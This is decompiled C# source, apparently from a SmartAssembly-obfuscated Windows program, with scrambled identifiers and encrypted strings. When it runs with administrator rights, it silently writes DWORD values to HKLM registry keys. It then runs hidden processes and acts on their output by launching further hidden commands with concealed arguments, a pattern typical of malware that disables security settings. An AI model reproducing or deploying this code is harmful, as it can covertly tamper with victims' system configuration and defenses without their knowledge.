using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

public static class CkzzKAVXXVvc
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void TETlAxFOYAphv()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			lkMwfilymhPvLW(getString_0(107407377), getString_0(107407316), getString_0(107389593));
			lkMwfilymhPvLW(getString_0(107407323), getString_0(107407262), getString_0(107407921));
			lkMwfilymhPvLW(getString_0(107406725), getString_0(107406604), getString_0(107407921));
			lkMwfilymhPvLW(getString_0(107406725), getString_0(107406599), getString_0(107407921));
			lkMwfilymhPvLW(getString_0(107406725), getString_0(107406562), getString_0(107407921));
			MiQjKKOlRdu();
		}
	}

	private static void lkMwfilymhPvLW(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void MiQjKKOlRdu()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392893),
			Arguments = getString_0(107406525),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107406968)) && text.EndsWith(getString_0(107406931)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107406922));
			}
			else if (text.StartsWith(getString_0(107406604)) && text.EndsWith(getString_0(107406931)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107406885));
			}
			else if (text.StartsWith(getString_0(107406816)) && text.EndsWith(getString_0(107406931)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107406783));
			}
			else if (text.StartsWith(getString_0(107406206)) && text.EndsWith(getString_0(107406931)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107406177));
			}
			else if (text.StartsWith(getString_0(107406116)) && text.EndsWith(getString_0(107406931)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107406059));
			}
			else if (text.StartsWith(getString_0(107406002)) && text.EndsWith(getString_0(107406931)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107406453));
			}
			else if (text.StartsWith(getString_0(107406360)) && text.EndsWith(getString_0(107406931)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107406327));
			}
			else if (text.StartsWith(getString_0(107406262)) && text.EndsWith(getString_0(107406931)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107406249));
			}
			else if (text.StartsWith(getString_0(107405660)) && text.EndsWith(getString_0(107406931)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107405631));
			}
			else if (text.StartsWith(getString_0(107405570)) && !text.EndsWith(getString_0(107405541)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107405536));
			}
			else if (text.StartsWith(getString_0(107405479)) && !text.EndsWith(getString_0(107389593)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107405938));
			}
			else if (text.StartsWith(getString_0(107405925)) && !text.EndsWith(getString_0(107405892)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107405887));
			}
			else if (text.StartsWith(getString_0(107405818)) && !text.EndsWith(getString_0(107405892)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107405749));
			}
			else if (text.StartsWith(getString_0(107405172)) && !text.EndsWith(getString_0(107405892)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107405139));
			}
			else if (text.StartsWith(getString_0(107405114)) && !text.EndsWith(getString_0(107405892)))
			{
				cDrxveNAPYpXUIxBZ(getString_0(107405045));
			}
		}
	}

	public static void cDrxveNAPYpXUIxBZ(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392893),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static CkzzKAVXXVvc()
	{
		Strings.CreateGetStringDelegate(typeof(CkzzKAVXXVvc));
	}
}
